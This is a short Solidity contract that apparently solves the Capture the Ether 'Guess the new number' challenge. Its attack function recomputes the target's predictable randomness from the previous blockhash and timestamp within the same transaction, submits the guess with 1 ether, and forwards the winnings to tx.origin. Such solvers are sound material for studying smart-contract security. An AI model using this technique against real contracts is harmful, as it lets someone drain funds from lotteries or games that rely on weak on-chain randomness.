pragma solidity ^0.7.3;

interface InterfaceNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {
    InterfaceNewNumberChallenge public challenge;

    constructor (address challengeAddress) {
        challenge = InterfaceNewNumberChallenge(challengeAddress);
    }

    function attack() external payable {
      // simulate the same what the challenge contract does
      require(address(this).balance >= 1 ether, "not enough funds");
      uint8 answer = uint8(uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
      ));
      challenge.guess{value: 1 ether}(answer);

      require(challenge.isComplete(), "challenge not completed");
      // return all of it to EOA
      tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}
